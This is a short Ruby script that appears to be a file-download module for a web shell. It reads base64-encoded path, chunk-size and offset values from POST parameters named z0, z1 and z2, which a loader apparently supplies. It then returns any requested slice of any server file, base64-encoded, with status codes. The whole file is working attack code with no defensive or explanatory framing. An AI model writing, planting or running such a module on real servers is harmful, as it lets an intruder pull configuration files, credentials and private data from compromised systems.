# $_POST: global variable used by the Ruby loader

require 'base64'

def main
  
  sz_path = Base64.decode64($_POST['z0'].to_s)
  sz_chunk_size = Base64.decode64($_POST['z1'].to_s)
  sz_offset = Base64.decode64($_POST['z2'].to_s)

  n_chunk_size = sz_chunk_size.to_i
  n_offset = sz_offset.to_i

  if !File.exist?(sz_path)
    print "0|ERROR://#{sz_path} not existed!"
    return
  end

  n_file_size = File.size(sz_path)
  if n_offset >= n_file_size
    print "2|"
    return
  end

  begin
    remaining = n_file_size - n_offset
    read_size = [n_chunk_size, remaining].min

    data = File.read(sz_path, read_size, n_offset, mode: 'rb')

    print "1|" + Base64.strict_encode64(data)
    return
  rescue => e
    print "0|ERROR://Read failed: #{e.message}"
    return
  end
end

main()